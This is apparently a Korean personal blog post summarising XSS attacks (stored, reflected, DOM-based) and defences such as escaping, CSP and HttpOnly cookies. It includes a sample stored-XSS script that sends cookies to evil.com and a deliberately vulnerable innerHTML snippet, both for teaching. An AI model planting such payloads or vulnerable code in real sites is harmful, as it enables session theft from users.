---
slug: xss-basics
title: XSS 공격 원리와 방어 방법 정리
authors: [haeun]
tags: [web-security, cs]
---

웹 보안 공부하면서 가장 먼저 배운 XSS(Cross-Site Scripting). 원리가 생각보다 단순한데 파급력이 크다.

<!-- truncate -->

## XSS란

사용자의 브라우저에서 **악성 스크립트를 실행**시키는 공격. 공격자가 입력한 JavaScript가 다른 사용자의 브라우저에서 실행된다.

## XSS 유형

### 1. Stored XSS (저장형)

악성 스크립트가 **서버에 저장**되어 다른 사용자가 페이지를 열 때 실행.

```html
<!-- 게시판에 이런 글을 작성하면 -->
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```

다른 사용자가 이 게시글을 열면 쿠키가 탈취됨.

### 2. Reflected XSS (반사형)

URL 파라미터에 스크립트를 넣어서 **서버 응답에 반사**시키는 방식.

```
https://example.com/search?q=<script>alert('xss')</script>
```

### 3. DOM-based XSS

서버를 거치지 않고 **클라이언트 사이드에서만** 발생. JavaScript가 DOM을 조작할 때 입력값을 검증하지 않으면 발생.

```javascript
// 취약한 코드
document.getElementById('output').innerHTML = location.hash.substring(1);
```

## 방어 방법

### 1. 입력값 이스케이핑

HTML 특수문자를 엔티티로 변환.

```
< → &lt;
> → &gt;
" → &quot;
' → &#x27;
```

### 2. CSP (Content Security Policy)

허용된 소스에서만 스크립트 실행을 허용.

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

### 3. HttpOnly 쿠키

JavaScript에서 쿠키 접근을 차단.

```http
Set-Cookie: session=abc123; HttpOnly; Secure
```

## 실습 (DVWA)

DVWA(Damn Vulnerable Web Application)에서 Low → Medium → High 난이도로 직접 공격/방어를 실습할 수 있다.

## 정리

- XSS = 브라우저에서 악성 스크립트 실행
- 저장형이 가장 위험 (서버에 저장됨)
- 방어: 입력값 이스케이핑 + CSP + HttpOnly 쿠키
- 항상 **사용자 입력을 신뢰하지 말 것**
